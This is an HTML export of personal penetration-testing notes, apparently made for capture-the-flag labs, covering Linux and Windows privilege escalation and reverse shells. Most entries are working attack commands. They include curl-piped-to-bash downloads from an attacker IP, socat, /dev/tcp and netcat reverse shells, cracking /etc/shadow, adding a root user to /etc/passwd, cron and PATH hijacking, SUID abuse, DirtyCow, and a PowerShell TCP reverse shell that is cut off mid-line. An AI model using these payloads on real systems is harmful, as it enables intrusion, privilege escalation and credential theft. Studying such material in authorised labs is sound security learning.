</strong>sysadmin<strong> /home/sysadmin/luvit</strong><br /></div><div class='page'><h1 class='title level-2'>OS version</h1><br/><strong><span style="color:#0000ff;">OS version/architecture </span></strong><br /><strong>uname -a  </strong>									<strong>#32,64bit</strong><br /><br /><strong><span style="color:#0000ff;">os-release</span></strong><br />cat<strong> /etc/*-release</strong><br /><br /><strong><span style="color:#0000ff;">version</span></strong><br />cat<strong> /proc/version   </strong>#Debian<br /></div><div class='page'><h1 class='title level-2'>ps</h1><br/><strong><span style="color:#0000ff;">PS     <br /></span></strong><strong><span style="color:#4d4d4d;">ps -aux  </span></strong><strong><span style="color:#0000ff;">   </span></strong><br /><strong>ps -aux | grep root  						#processes running  </strong><br /><br /><strong>ps -ef</strong><br /><strong>ps -ef | grep root  </strong>							#find process with group=us<br /> <br />  <br /><br /></div><div class='page'><h1 class='title level-2'>config files</h1><br/>ls -la<strong> /.devs/dev_sess  </strong>																owner:root group owner=us</div><div class='page'><h1 class='title level-2'>sudoers</h1><br/><strong><span style="color:#0000ff;">SUDOERS</span></strong><br />cat <strong>/etc/sudoers</strong><br /></div><div class='page'><h1 class='title level-2'>bash history</h1><br/><strong><span style="color:#0000ff;">BASH HISTORY</span></strong>													<br />echo<strong> $HISTFILE</strong>							#to see file used<br />cat ~<strong>/.bash_history</strong>						<strong>#executed commands</strong>						<br />cat <strong>~/.zsh_history  </strong><br /></div><div class='page'><h1 class='title level-2'>automatic scripts</h1><br/><strong><span style="color:#ff0000;">AUTOMATIC SCRIPTS</span></strong><strong><br /></strong><strong><span style="color:#0000ff;">LinEnum<br />Linpeas</span></strong></div><div class='page'><h1 class='title level-3'>linenum</h1><br/><strong><span style="color:#0000ff;">LINENUM</span></strong><br /><strong>python -m SimpleHTTPServer   </strong>											#<strong>attacker</strong><br /><strong>curl</strong> 10.8.185.233:8000/<strong>LinEnum.sh | bash</strong> 						#<strong>victim  </strong>			(o <strong>wget</strong> 10.8.185.233:8000/<strong>LinEnum.sh</strong> + <strong>bash LinEnum.sh</strong>) (o <strong>sh</strong>) <br /><br /><br /><strong>Netcat</strong><br />nc -l -p <strong>9001</strong> &gt; LinEnum.sh    										#victim<br />nc -w -3 <strong>10.10.212.79 9001</strong> &lt; LinEnum.sh  			#attacker<br /><strong>chmod +x LinEnum.sh</strong><br /></div><div class='page'><h1 class='title level-3'>linpeas</h1><br/><strong><span style="color:#0000ff;">LINPEAS</span></strong><br /><strong>python -m</strong> <strong>SimpleHTTPServer  </strong>									#<strong>attacker</strong><br /><strong>curl </strong>10.8.185.233:<strong>8000</strong>/<strong>linpeas.sh</strong> | <strong>bash</strong>					#<strong>victim</strong><br /></div><div class='page'><h1 class='title level-2'>shell stabilization</h1><br/><strong><span style="color:#ff0000;">SHELL STABILIZATION</span></strong><br /><strong><span style="color:#0000ff;">NETCAT SHELL</span></strong>																		<strong>#TTY shell</strong><br /><strong>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </strong>							#or <strong>python3</strong>  			<br /><strong>Ctrl+Z</strong>      																								<strong>#background shell</strong><br /><strong>stty raw -echo; fg </strong>   																			#<strong>tab autocompletion</strong><br /><br /><strong><span style="color:#0000ff;">#enable clear</span></strong><br /><strong>export TERM=xterm </strong>  													<strong> #adds command </strong>(es <strong>clear</strong>=<strong>ctrl+L</strong>)<br /><br /><strong><span style="color:#0000ff;">#fix rows/columns    </span></strong><br /><strong>stty -a </strong>     														<strong>	#in host, check rows, columns</strong><br /><strong>stty rows </strong>40<strong> cols </strong>160   									#on box<br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>socat</h1><br/><strong><span style="color:#0000ff;">TTY REVERSE SHELL (Socat)</span></strong><br /><strong>socat TCP-L:</strong>4444<strong> FILE:`tty`,raw,echo=0             																		#attacker</strong><br /><strong>socat TCP:10.8.185.233:4444 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane #victim</strong><br />socat tcp-connect:10.8.185.233:4444 EXEC:sh,pty,stderr,setsid,sigint,sane  <br /></div><div class='page'><h1 class='title level-2'>etc/shadow</h1><br/><strong><span style="color:#ff0000;">ETC/SHADOW</span></strong><br /><strong>cat </strong>/etc/<strong>shadow</strong>							#contains passwords<br />user:<strong>$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8</strong>.:17298:0:99999:7:::<br /><br /><strong><span style="color:#0000ff;">#default permissions</span></strong><br /><strong>ls -l /etc/shadow  								</strong><strong><span style="color:#0000ff;">-rw-r----- </span></strong><strong> </strong><br /> <br /><strong><span style="color:#0000ff;">#readable</span></strong><br /><strong>#copy password</strong><br /><strong>john</strong> --wordlist=rockyou.txt <strong>hashforcrack.txt</strong><br /><br /><strong><span style="color:#0000ff;">#writable</span></strong><br /><strong>mkpasswd -m sha-512 password</strong><br />#overwrite password<br /><strong>su root</strong><br /></div><div class='page'><h1 class='title level-2'>etc/passwd</h1><br/><strong><span style="color:#ff0000;">ETC/PASSWD</span></strong><br /><strong>cat</strong> /etc/<strong>passwd                    </strong><br />        <br />  <table class="table"><tr><th>USN</th><th>PSW</th><th>UID</th><th>GID</th><th>  User ID</th><th>Info</th><th>Home directory</th><th>Command,shell</th></tr><tr><td>test:</td><td>x:</td><td>0:</td><td>0:</td><td>root:</td><td> </td><td>/root:</td><td>/bin/bash</td></tr></table><br />   <br /><strong><span style="color:#0000ff;">#default permissions (world-readable)</span></strong><br /><strong>ls -la /etc/passwd   												</strong><strong><span style="color:#0000ff;">-rw-r--r-- </span></strong><strong> </strong><br /><br /><strong><span style="color:#0000ff;">#users that can run shell </span></strong><br /> cat /etc/passwd <strong>| grep &quot;/bin/bash&quot;</strong><br />cat /etc/passwd<strong> | grep bash</strong><br /><strong>#exclude nologin</strong><br />cat /etc/passwd <strong>| grep -v nologin </strong> <br /><br /><br /><strong><span style="color:#0000ff;">#writable</span></strong><br /><strong><span style="color:#4d4d4d;">#create a new password</span></strong><br /><strong>openssl passwd</strong> ippsec<br /><strong>openssl passwd -1 -salt new 123   																					#-1=MD5</strong><br /><br /><strong>#write password generated</strong><br />new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:/root:/bin/bash<br /></div><div class='page'><h1 class='title level-2'>etc/shells</h1><br/><strong><span style="color:#0000ff;">Shells</span></strong><br />cat /etc/<strong>shells   				#shells available</strong><br /></div><div class='page'><h1 class='title level-2'>logs</h1><br/><strong><span style="color:#ff0000;">LOGS</span></strong><br /><strong>find . | grep config</strong><br /><br /><strong>grep -R pass .</strong><br /><br /><br /><strong><span style="color:#0000ff;">SYSTEM LOGS</span></strong><br /><strong>/var/log/auth.log    							#SSH logins</strong><br /><strong>/var/log/syslog    							#system events, cronjobs</strong><br /> <br /><strong><span style="color:#0000ff;">Apache2</span></strong><br /><strong>/var/log/apache2/access.log  </strong><br /><strong>/var/apache2/config.inc</strong><br /> <br /><strong><span style="color:#0000ff;">Wordpress</span></strong><br /><strong>/var/www/html/wp-config.php</strong> | grep -i pass <strong> 														 </strong>(DB_USER, DB_PASSWORD)<br /> <br /><strong><span style="color:#0000ff;">phpmyadmin</span></strong><br /><strong>/etc/phpmyadmin/config-db.php</strong><br /></div><div class='page'><h1 class='title level-2'>cronjobs</h1><br/><strong><span style="color:#ff0000;">CRONJOBS</span></strong><strong> 								#automated scripts</strong> es: backup scripts<br /><strong><span style="color:#0000ff;">#CRONTAB</span></strong><br /><strong><span style="color:#0000ff;">/etc/crontab</span></strong><br /> <strong>cat /etc/crontab             </strong><br />   <strong>                                                        </strong><br />   <table class="table"><tr><th>ID</th><th>min</th><th>hour</th><th>day</th><th>month</th><th>dayweek</th><th>user</th><th>command</th></tr><tr><td>17</td><td>*</td><td>1</td><td>*</td><td>*</td><td>*</td><td>root</td><td>cd / &amp;&amp; run-parts --report /etc/cron.hourly</td></tr></table><br /> <strong>                           overwrite.sh  </strong><br /><strong><span style="color:#0000ff;">#find job</span></strong><br /><strong>locate </strong>overwrite.sh <br /><strong><span style="color:#0000ff;">#see file permissions</span></strong><br /><strong>ls -l </strong>/usr/local/bin/<strong>overwrite.sh   								#writable</strong><br /><strong><span style="color:#0000ff;">#overwrite</span></strong><br /><strong>#!/bin/bash</strong><br /><strong>bash -i &gt;&amp; /dev/tcp/</strong>10.8.185.233/4444 0&gt;&amp;1<br />     <br /><strong>nc -lvnp 4444</strong><br /> <br />  <br /><strong><span style="color:#4d4d4d;">#crontabs</span></strong><br /><strong>file:///var/spool/cron/crontabs/root  </strong><br /></div><div class='page'><h1 class='title level-2'>environment variables</h1><br/><strong><span style="color:#ff0000;">ENVIRONMENT VARIABLES</span></strong><br /><strong>echo $PATH </strong><strong><span style="color:#0000ff;">    </span></strong>										<br />	/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br /> <br /><strong><span style="color:#0000ff;">#add writable folder in path</span></strong><br /><strong>export PATH=.:</strong>$PATH<br /><strong>export PATH</strong>=<strong>/tmp:</strong>$PATH   						← <br /><strong>export PATH=</strong>&quot;<strong>$HOME/bin:</strong>$PATH<strong>&quot;</strong></div><div class='page'><h1 class='title level-2'>path hijacking</h1><br/><strong><span style="color:#0000ff;">PATH HIJACKING</span></strong><br /><strong><span style="color:#0000ff;">Es 1:</span></strong>			nano<strong> overwrite.sh</strong><br /><strong>#!/bin/bash</strong><br /><strong>cp /bin/bash /tmp/rootbash</strong><br /><strong>chmod +xs</strong> /tmp/rootbash<br /> <br /><strong>chmod +x overwrite.sh</strong><br /><strong>/tmp/rootbash -p</strong><br /> <br /><strong><span style="color:#0000ff;">Es 2 (rev shell)</span></strong><br />#!/bin/bash<br /><strong>bash -i &gt;&amp; /dev/tcp/10.10.14.11/9001 0&gt;&amp;1</strong><br /><br /><strong><span style="color:#0000ff;">Es 3 (add new user)</span></strong>				nano <strong>uname</strong>			<br />#!/bin/bash<br />echo<strong> &#39;rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash&#39;</strong> &gt;&gt;<strong> /etc/passwd</strong><br /><br /><strong>chmod +x uname</strong><br />cp uname <strong>/usr/local/bin</strong><br /><br /><strong><span style="color:#0000ff;">Es 4:</span></strong><br />#!/bin/sh<br /><strong>bash -i</strong><br /><br /><strong><span style="color:#0000ff;">Es 5:</span></strong><br /><strong>strings</strong> /usr/local/bin/<strong>suid-env    																												</strong>#no full path shown for apache2<br />echo <strong>&#39;int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; }</strong>&#39; &gt; /tmp/<strong>service.c</strong><br /><strong>gcc -o </strong>/tmp/<strong>service</strong> /tmp/<strong>service.c </strong> 																												 <br /><strong>export PATH=/tmp:$PATH</strong><br />/usr/local/bin/suid-env<br /></div><div class='page'><h1 class='title level-2'>SUID</h1><br/><strong><span style="color:#ff0000;">SUID   </span></strong><strong><br />SUID 4  rw</strong><strong><span style="color:#0000ff;">s</span></strong><strong>-rwx-rwx   														</strong><br /><strong><span style="color:#0000ff;">#search files with SUID bit set</span></strong><br /><strong>find / -perm -4000 -ls</strong> 2&gt;/dev/null									#<strong>-ls command	</strong>			<strong>4000= SUID bit set</strong><br /><strong>find </strong>/ <strong>-type f </strong>-perm -4000<strong> -ls </strong>2&gt;/dev/null						 	# <strong>-perm -u=s</strong>	<br />find / -type f <strong>-user root -perm -4000</strong> -ls 2&gt;/dev/null 		(also other users)<br />find / -perm -4000 -ls 2&gt;/dev/null | <strong>grep -v 201</strong><br /> <br /><strong><span style="color:#0000ff;">#shell</span></strong><br />/bin/bash <strong>-p  </strong>					#<strong>-p</strong> =<strong> </strong>use SUID bit  (oppure <strong>./bash -p</strong>)<br /><br /><strong><span style="color:#ff0000;">SGID</span></strong><br /><strong>SGID 2  rwx-rw</strong><strong><span style="color:#0000ff;">s</span></strong><strong>-rwx</strong></div><div class='page'><h1 class='title level-2'>pspy</h1><br/><strong><span style="color:#0000ff;">PSPY      									 </span></strong><strong>	#shows processes as they launch</strong><br /><strong>wget</strong> 10.10.14.11:8000/<strong>pspy64s</strong><br /><strong>chmod +x pspy64s</strong><br /><strong>./pspy64s   					#processes   </strong>													<strong>(then login again as ssh)</strong><br /><strong>./pspy64s -f  				#processes + files/ directories accesses</strong><br /></div><div class='page'><h1 class='title level-2'>stored passwords</h1><br/><strong><span style="color:#0000ff;">STORED PASSWORDS</span></strong></div><div class='page'><h1 class='title level-3'>config</h1><br/><strong><span style="color:#0000ff;">CONFIG</span></strong><br />cat /<strong>home/user/myvpn.ovpn</strong><br />cat /home/user/.irssi/<strong>config</strong> | grep -i passw<br /></div><div class='page'><h1 class='title level-3'>history</h1><br/><strong><span style="color:#0000ff;">HISTORY</span></strong><br /><strong>cat ~/.*history | less</strong><br />cat ~/<strong>.bash_history </strong>| grep -i passw<br /></div><div class='page'><h1 class='title level-3'>ssh</h1><br/><strong><span style="color:#0000ff;">SSH</span></strong><br /><strong>ls -la /      </strong>																#<strong>hidden files </strong>in root dir<br />find <strong>/ -type d</strong> -name .<strong>ssh </strong>2&gt;/dev/null  				#<strong>.ssh</strong> <strong>directory</strong><br /><strong>find / -name id_rsa</strong> 2&gt; /dev/null 						#find<strong> private SSH keys</strong><br /></div><div class='page'><h1 class='title level-2'>kernel exploitation</h1><br/><strong><span style="color:#0000ff;">KERNEL EXPLOITATION</span></strong><br /><strong>kernel</strong> of the machine (<strong>kernel exploitation</strong> such as <strong>Dirtyc0w</strong>)</div><div class='page'><h1 class='title level-3'>dirtycow</h1><br/><strong><span style="color:#0000ff;">DIRTYCOW (ubuntu 14&lt;)</span></strong><br /><strong>gcc</strong> -pthread <strong>dirtyc0w.c</strong> <strong>-o dirty </strong>-lcrypt<br /><strong>./dirty pss psw</strong><br /></div><div class='page'><h1 class='title level-1'>---------WINDOWS----------------</h1><br/><strong><span style="color:#ff0000;background-color:#ffff00;">WINDOWS</span></strong></div><div class='page'><h1 class='title level-1'>basic commands</h1><br/><a href=""><img src="images/256-1.png" alt="images/256-1.png" /></a></div><div class='page'><h1 class='title level-2'>dir</h1><br/><strong><span style="color:#0000ff;">DIR</span></strong><br /><strong>dir</strong><br /><strong>dir </strong>documents							<br /><strong><span style="color:#0000ff;">#hidden files   </span></strong><br /><strong>dir /a<br />	</strong>	<br /><strong>dir /r	</strong><br /><br />  <br /></div><div class='page'><h1 class='title level-2'>cd</h1><br/><strong><span style="color:#0000ff;">CD</span></strong><strong> </strong> <br /><strong>cd &quot;C:\users\administrator\desktop&quot;  								#</strong>also single &#39;<br /><strong>cd &quot;C:\program files (x86)&quot;</strong><br /></div><div class='page'><h1 class='title level-2'>copy</h1><br/><strong><span style="color:#0000ff;">COPY</span></strong><br /><strong>copy</strong> <strong>htmplhelp.exe</strong> <strong>..\Desktop</strong><br /><strong>copy ASCService.exe &quot;</strong>\Program Files (x86)\IObit\Advanced SystemCare\<strong>ASCService.exe&quot;</strong><br /><br /></div><div class='page'><h1 class='title level-2'>type</h1><br/><strong><span style="color:#0000ff;">TYPE  </span></strong>									<strong>#open files</strong><br /><strong>type </strong>confCons.xml<br /></div><div class='page'><h1 class='title level-2'>more</h1><br/><strong><span style="color:#0000ff;">MORE</span></strong><strong> </strong> 								<strong>#open files</strong><br /><strong>more </strong>user.txt <strong>     </strong><br /><strong>more</strong> desktop.ini</div><div class='page'><h1 class='title level-2'>whoami</h1><br/><strong><span style="color:#0000ff;">WHOAMI</span></strong><br /><strong>whoami</strong><br /><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">groups</span></strong><br /><strong>whoami /groups</strong><br /> <br /><br /><strong><span style="color:#0000ff;">#privileges</span></strong><br /><strong>whoami /priv</strong><br /><br /><strong>#SeImersonatePrivilege</strong><br /><strong>#SeAssignPrimaryTokenPrivilege</strong><br /> <br /><br /></div><div class='page'><h1 class='title level-2'>ipconfig</h1><br/><strong><span style="color:#0000ff;">IPCONFIG</span></strong><br /><strong>ipconfig</strong><br /><br /><strong>ipconfig /all</strong><br /></div><div class='page'><h1 class='title level-2'>systeminfo</h1><br/><strong><span style="color:#0000ff;">SYSTEMINFO</span></strong><br /><strong>systeminfo</strong>										<span style="color:#4d4d4d;">#</span><strong><span style="color:#4d4d4d;">OS version/ hotfix</span></strong><br /><br /><strong><span style="color:#0000ff;">HOSTNAME</span></strong><br /><strong>hostname</strong><br /> <br /><strong><span style="color:#0000ff;">#windows version</span></strong><br /><strong>ver 							</strong></div><div class='page'><h1 class='title level-2'>tasklist</h1><br/><strong><span style="color:#0000ff;">TASKLIST</span></strong>							<strong><span style="color:#0000ff;">#process list</span></strong><br /><strong>tasklist</strong>										<br /><br />  <br />#<strong>user logged</strong><br /><strong>lsass.exe  </strong>								<strong>		#windows authentication </strong> (NT AUTHORITY\SYSTEM)</div><div class='page'><h1 class='title level-2'>runas</h1><br/><strong><span style="color:#0000ff;">RUNAS</span></strong>																<strong>#run command ad new user</strong><br /><strong>runas /netonly /user:</strong>mirco<strong> cmd</strong>													<strong>#opens a new terminal with given user</strong><br /><strong>runas /netonly /user:</strong>active.htb\svc_tgs<strong> cmd  				</strong>			#usr+domain<br /></div><div class='page'><h1 class='title level-2'>exec</h1><br/><strong><span style="color:#0000ff;">.exe</span></strong><strong><br />cmd.exe /c </strong>echo &quot;Hello World&quot;<br /><strong>.\revshell.exe</strong><br /><br /><strong><span style="color:#0000ff;">.msi</span></strong><br /><strong>msiexec /q /i</strong> payload.msi<br /></div><div class='page'><h1 class='title level-2'>clear</h1><br/><strong><span style="color:#0000ff;">CLEAR</span></strong><br /><strong>cls </strong><br /></div><div class='page'><h1 class='title level-2'>findstr</h1><br/><strong><span style="color:#0000ff;">FINDSTR</span></strong><br /><strong>findstr /S password</strong>								#current folder/subfolder<br />type * |<strong> findstr password</strong><br /></div><div class='page'><h1 class='title level-2'>service control</h1><br/><strong><span style="color:#0000ff;">SERVICE CONTROL</span></strong><br /><strong>sc start </strong>AdvancedSystemCareService9<br /><strong>sc stop </strong>AdvancedSystemCareService9<br /></div><div class='page'><h1 class='title level-2'>icacls</h1><br/><strong><span style="color:#0000ff;">ICACLS												</span></strong><strong><span style="color:#4d4d4d;">#manages DACL permissions (Discretionary Access Control List)</span></strong><br /><strong>icacls</strong> C:\Users\Public\Desktop														<br /><br /><br /><a href=""><img src="images/374-1.png" alt="images/374-1.png" /></a></div><div class='page'><h1 class='title level-2'>help</h1><br/><strong><span style="color:#0000ff;">HELP</span></strong><br /><strong>help</strong> dir<br /></div><div class='page'><h1 class='title level-2'>utils</h1><br/></div><div class='page'><h1 class='title level-3'>convert dos/unix</h1><br/><strong><span style="color:#0000ff;">CONVERT .sh</span></strong><br /><strong>dos2unix </strong>exploit.sh<br /></div><div class='page'><h1 class='title level-3'>macros</h1><br/><strong><span style="color:#0000ff;">MACROS</span></strong><br /><strong>unzip </strong>&quot;Currency Volume Report.<strong>xlsm</strong>&quot;<br /><strong>strings xl</strong>/vbaProject.<strong>bin</strong>    										 #xl folder<br /></div><div class='page'><h1 class='title level-1'>powershell</h1><br/><strong><span style="color:#ff0000;">POWERSHELL</span></strong><br /><strong><span style="color:#0000ff;">cmdlet</span></strong><br /><strong>Get, 		Start/ Stop</strong>, 		<strong>Read/ Write,		New</strong>, 			<strong>Out</strong><br /> <br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>powershell -c</h1><br/><strong><span style="color:#0000ff;">POWERSHELL -C</span></strong><br /><strong>powershell</strong> <strong>-c </strong>wget &quot;http://10.8.185.233/ASCService.exe&quot;<strong> </strong>-outfile &quot;ASCService.exe&quot;<br />powershell -c <strong>&quot;Get-Service&quot;</strong><br /><br /><strong><span style="color:#4d4d4d;">powershell -ep bypass  	</span></strong><strong>				#bypass execution policies</strong></div><div class='page'><h1 class='title level-2'>powershell -EncodedCommand</h1><br/><strong><span style="color:#0000ff;">POWERSHELL -ENCODEDCOMMAND</span></strong><br />sudo<strong> tcpdump -i tun0 icmp </strong> <br /><strong>echo &#39;ping -n 1 10.10.14.18&#39; | </strong>iconv -t utf-16le<strong> |</strong> base64 -w 0					→ cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgAxADgACgA=<br /><br /><strong><span style="color:#0000ff;">#-EncodedCommand</span></strong><br /><strong>powershell -EncodedCommand </strong>cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgAxADgACgA=</div><div class='page'><h1 class='title level-2'>gci</h1><br/><strong><span style="color:#0000ff;">GCI  </span></strong><strong>															#get child item</strong><br /><strong>gci</strong><br /><strong><span style="color:#0000ff;">#hidden files</span></strong><br /><strong>gci -hidden </strong><strong><span style="color:#0000ff;"> 	<br />												 </span></strong><br /><strong><span style="color:#0000ff;">#recursive</span></strong><br /><strong>gci -recurse</strong><br /><strong>gci -recurse | select FullName  </strong><br /><strong>gci -recurse -include </strong>*.* <strong>| select FullName    				 #find all files</strong><br /></div><div class='page'><h1 class='title level-2'>gc</h1><br/><strong><span style="color:#0000ff;">GC</span></strong><strong>    												</strong><strong><span style="color:#4d4d4d;">#get content</span></strong><br /><strong>gc </strong>PowerShell_transcript.txt<br /></div><div class='page'><h1 class='title level-2'>Start-Process</h1><br/><strong><span style="color:#0000ff;">START-PROCESS</span></strong><br /><strong>Start-Process &quot;shell.exe&quot;</strong><br /></div><div class='page'><h1 class='title level-2'>measure</h1><br/><strong><span style="color:#0000ff;">MEASURE</span></strong><br />Get-LocalGroup | <strong>measure</strong></div><div class='page'><h1 class='title level-2'>Get-Content</h1><br/><strong><span style="color:#0000ff;">GET-CONTENT</span></strong><strong> 										</strong><strong><span style="color:#0000ff;">#open file</span></strong><br /><strong>Get-Content</strong> Tasks.bat<br /><strong>Get-Content &quot;</strong>ZKAccess3.5 Security System.lnk<strong>&quot;</strong><br /></div><div class='page'><h1 class='title level-2'>Get-LocalUser</h1><br/><strong><span style="color:#0000ff;">GET-LOCALUSER</span></strong><span style="color:#0000ff;">	</span>					<strong><span style="color:#0000ff;">#list all users</span></strong><br /><strong>Get-LocalUser</strong>																									<span style="color:#4d4d4d;">	 </span><br /><br /><strong>Get-LocalUser -SID </strong>&quot;S-1-5-21-1394777289-3961777894-1791813945-501&quot;<br /><strong>Get-LocalUser | Where-Object -Property PasswordRequired -Match false</strong></div><div class='page'><h1 class='title level-2'>Get-LocalGroup</h1><br/><strong><span style="color:#0000ff;">GET-LOCALGROUP</span></strong>					<strong>#local security groups in SAM</strong><br /><strong>Get-LocalGroup</strong><br /></div><div class='page'><h1 class='title level-2'>Get-ChildItem</h1><br/><strong><span style="color:#0000ff;">GET-CHILDITEM</span></strong><strong>										</strong><strong><span style="color:#0000ff;">#search file</span></strong><br /><strong>Get-ChildItem *.lnk</strong>																						#in current folder<br /><strong>Get-ChildItem &quot;C:\&quot; *.lnk -Recurse -Force </strong>|<strong> ft fullname</strong>						#compact list<br /><strong><span style="color:#0000ff;">#include</span></strong><br /><strong>Get-ChildItem</strong> <strong>-Path</strong> C:\ <strong>-Include</strong> *b64.txt*<strong> -File</strong> <strong>-Recurse</strong><br /><strong>Get-ChildItem -Path</strong> C:\ <strong>-Include</strong> *interesting-file.txt*<strong> </strong>-File -Recurse<strong> -ErrorAction SilentlyContinue</strong>								#hide errors<br /><strong>Get-ChildItem</strong> <strong>-Path</strong> C:\ <strong>-Include</strong> *.<strong>bak</strong>* -File -Recurse -ErrorAction SilentlyContinue<br /><br /><strong><span style="color:#0000ff;">#string pattern in files</span></strong><br /><strong>Get-ChildItem</strong> C:\* -Recurse | <strong>Select-String -pattern</strong> API_KEY  																<strong>#searches strings inside files</strong></div><div class='page'><h1 class='title level-2'>Get-Process</h1><br/><strong><span style="color:#0000ff;">GET-PROCESS</span></strong><strong>					</strong><strong><span style="color:#0000ff;">#processes</span></strong><br /><strong>Get-Process</strong><br /><br /></div><div class='page'><h1 class='title level-2'>Get-ScheduledTask</h1><br/><strong><span style="color:#0000ff;">GET-SCHEDULEDTASK  </span></strong><br /><strong>Get-ScheduledTask  </strong><br /><strong>Get-ScheduledTask -TaskName </strong>new-sched-task</div><div class='page'><h1 class='title level-2'>Get-NetIPAddress</h1><br/><strong><span style="color:#0000ff;">GET-NETIPADDRESS</span></strong><strong>				</strong><strong><span style="color:#0000ff;"> #ip address</span></strong><br /><strong>Get-NetIPAddress</strong></div><div class='page'><h1 class='title level-2'>Get-NetTCPConnection</h1><br/><strong><span style="color:#0000ff;">GET-NETTCPCONNECTION</span></strong><strong>				#open ports</strong><br /><strong>Get-NetTCPConnection</strong><br /><strong>Get-NetTCPConnection | Where-Object -Property </strong>State<strong> -Match </strong>Listen<strong>  					#listen ports</strong></div><div class='page'><h1 class='title level-2'>Get-Command</h1><br/><strong><span style="color:#0000ff;">GET-COMMAND</span></strong><br /><strong><span style="color:#0000ff;">#search command</span></strong><br /><strong>Get-Command *hash*</strong><br /><strong>Get-Command *hash* | Select-Object -First 1</strong><br /><strong>#type</strong><br /><strong>Get-Command | Where-Object -Parameter </strong>CommandType<strong> -eq </strong>Cmdlet<strong> | measure</strong><br /> <br /><strong><span style="color:#0000ff;">#list parameters</span></strong><br /><strong>(Get-Command Get-LocalUser).Parameters</strong><br /><strong><span style="color:#0000ff;">#list methods of command</span></strong><br /><strong>Get-LocalUser | Get-Member</strong><br /> <br /> <br /> <br /><br /></div><div class='page'><h1 class='title level-2'>Get-Location</h1><br/><strong><span style="color:#0000ff;">GET-LOCATION</span></strong><span style="color:#0000ff;"> 	</span>											<strong><span style="color:#0000ff;">#pwd</span></strong><br /><strong>Get-Location</strong>  																					<br /><strong>Get-Location -Path </strong>“C:\Users\Administrator\Documents\Passwords” 					<strong>#see if path exists</strong></div><div class='page'><h1 class='title level-2'>Get-ADObjects</h1><br/><strong><span style="color:#0000ff;">GET-ADOBJECT</span></strong>								<strong><span style="color:#0000ff;">#gets AD Object</span></strong><br /><strong>Get-ADObject -SearchBase </strong>&quot;<strong>CN</strong>=Deleted Objects,<strong>DC</strong>=Cascade,<strong>DC</strong>=Local&quot; <strong>-Filter</strong> {ObjectClass -eq &quot;user&quot;} <strong>-IncludeDeletedObjects -Properties *</strong><br /><br /><strong>Get-ADObject -ldapfilter </strong>&quot;(&amp;(isDeleted=TRUE))&quot;<strong> -IncludeDeletedObjects -Properties *</strong><br /><strong>Get-ADObject -ldapfilter </strong>&quot;(&amp;(objectclass=user)(isDeleted=TRUE))&quot; <strong>- IncludeDeletedObjects -Properties *</strong></div><div class='page'><h1 class='title level-2'>Get-Acl</h1><br/><strong><span style="color:#0000ff;">GET-ACL</span></strong><span style="color:#0000ff;">		</span>			<strong>		</strong><strong><span style="color:#4d4d4d;">#</span></strong><strong>access control list of resource </strong><br /><strong>Get-Acl </strong>C:/								<strong>#permission required to access resource</strong></div><div class='page'><h1 class='title level-2'>Get-Help</h1><br/><strong><span style="color:#0000ff;">GET-HELP</span></strong><br /><strong>Get-Help</strong> <strong>Get-command</strong> -examples</div><div class='page'><h1 class='title level-2'>altro</h1><br/><strong><span style="color:#0000ff;">#see if limitations</span></strong><br />powershell<strong> $ExecutionContext.SessionState.LanguageMode</strong><br /><br /><strong><span style="color:#0000ff;">#hash</span></strong><br /><strong>Get-FileHash -Path </strong>&quot;C:\Program Files\interesting-file.txt.txt&quot;<strong> -Algorithm </strong>MD5<br /><br /><strong><span style="color:#0000ff;">#patches</span></strong><br /><strong>Get-Hotfix</strong></div><div class='page'><h1 class='title level-1'>permissions</h1><br/><strong><span style="color:#0000ff;">PERMISSIONS</span></strong><br /><strong>Permission					Meaning for Folders																																					Meaning for Files</strong><br /><strong><span style="color:#0000ff;">Read</span></strong>								Permits viewing and listing of files and subfolders																										Permits viewing or accessing of the file&#39;s contents<br /><strong><span style="color:#0000ff;">Write</span></strong>								Permits adding of files and subfolders																															Permits writing to a file<br /><strong><span style="color:#0000ff;">Read &amp; Execute</span></strong><strong>		</strong>	Permits viewing and listing of files and subfolders as well as executing of files; inherited by files and folders		Permits viewing and accessing of the file&#39;s contents as well as executing of the file<br /><strong><span style="color:#0000ff;">List Folder Contents</span></strong>	Permits viewing and listing of files and subfolders as well as executing of files; inherited by folders only			N/A<br /><strong><span style="color:#0000ff;">Modify</span></strong><span style="color:#0000ff;">	</span>						Permits reading and writing of files and subfolders; allows deletion of the folder													Permits reading and writing of the file; allows deletion of the file<br /><strong><span style="color:#0000ff;">Full Control</span></strong><span style="color:#0000ff;">	</span>				Permits reading, writing, changing, and deleting of files and subfolders																	Permits reading, writing, changing and deleting of the file</div><div class='page'><h1 class='title level-1'>rlwrap (netcat)</h1><br/><strong><span style="color:#0000ff;">RLWRAP (NETCAT)</span></strong><br /><strong>rlwrap nc -lvnp 9001   </strong>									<strong>#allow to move inside terminal</strong><br /></div><div class='page'><h1 class='title level-1'>shells</h1><br/></div><div class='page'><h1 class='title level-2'>netcat</h1><br/><strong><span style="color:#ff0000;">NETCAT (Windows)</span></strong><br />python3 -m http.server <br />nc -nlvp 9001<br />curl 10.10.16.2:8000/<strong>nc.exe </strong>-o <strong>nc.exe</strong><br /><strong>nc.exe 10.10.16.2 9001 -e powershell</strong><br /><br />#ping a port<br /><strong>.\nc.exe -zv localhost</strong> 8888</div><div class='page'><h1 class='title level-2'>shell.ps1</h1><br/><strong><span style="color:#0000ff;">#shell.ps1 </span></strong>																	<strong>#use my ip </strong><br /> $client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.113&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback 